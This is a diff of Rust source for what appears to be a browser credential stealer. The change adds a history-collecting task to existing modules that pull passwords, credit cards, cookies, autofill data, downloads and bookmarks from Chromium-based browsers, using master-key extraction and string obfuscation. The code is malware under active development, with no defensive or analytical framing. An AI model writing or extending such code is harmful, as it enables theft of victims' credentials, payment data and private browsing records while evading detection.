@@ -4,21 +4,23 @@ mod autofill;
 mod passwords;
 mod creditcards;
 mod downloads;
+mod hisotry;
 
-use alloc::borrow::ToOwned;
-use alloc::sync::Arc;
-use alloc::vec::Vec;
-use crate::vec;
-use tasks::{composite_task, CompositeTask, Task};
-use utils::path::Path;
-use obfstr::obfstr as s;
-use utils::browsers::chromium::extract_master_key;
 use crate::chromium::autofill::AutoFillTask;
 use crate::chromium::bookmarks::BookmarksTask;
 use crate::chromium::cookies::CookiesTask;
-use crate::chromium::passwords::PasswordsTask;
-use crate::chromium::downloads::DownloadsTask;
 use crate::chromium::creditcards::CreditCardsTask;
+use crate::chromium::downloads::DownloadsTask;
+use crate::chromium::hisotry::HistoryTask;
+use crate::chromium::passwords::PasswordsTask;
+use crate::vec;
+use alloc::borrow::ToOwned;
+use alloc::sync::Arc;
+use alloc::vec::Vec;
+use obfstr::obfstr as s;
+use tasks::{composite_task, CompositeTask, Task};
+use utils::browsers::chromium::extract_master_key;
+use utils::path::Path;
 
 pub struct ChromiumTask<'a> {
     tasks: Vec<(ChromiumBasedBrowser<'a>, CompositeTask)>,
@@ -44,7 +46,8 @@ impl ChromiumTask<'_> {
                     AutoFillTask::new(browser.clone()),
                     PasswordsTask::new(browser.clone()),
                     DownloadsTask::new(browser.clone()),
-                    CreditCardsTask::new(browser.clone())
+                    CreditCardsTask::new(browser.clone()),
+                    HistoryTask::new(browser.clone()),
                 )
             ))
         }
